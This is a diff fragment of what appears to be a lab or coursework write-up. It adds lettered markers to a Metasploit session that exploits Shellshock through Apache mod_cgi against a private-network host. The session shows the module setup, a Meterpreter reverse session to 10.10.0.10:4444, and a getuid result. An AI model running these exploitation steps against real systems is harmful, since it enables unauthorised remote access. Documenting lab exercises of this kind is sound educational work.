@@ -127,6 +127,7 @@ Matching Modules
    10  exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  No     Dhclient Bash Environment Variable Injection (Shellshock)
    11  exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection (Shellshock)
 
+d)
 msf5 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
 msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOST 10.10.0.35
 RHOST => 10.10.0.35
@@ -174,7 +175,8 @@ msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
 [*] Sending stage (985320 bytes) to 10.10.0.35
 [*] Meterpreter session 1 opened (10.10.0.10:4444 -> 10.10.0.35:56709) at 2020-03-11 17:11:59 -0400
 
+e)
+
 meterpreter > getuid
 Server username: uid=33, gid=33, euid=33, egid=33
 meterpreter > 
-
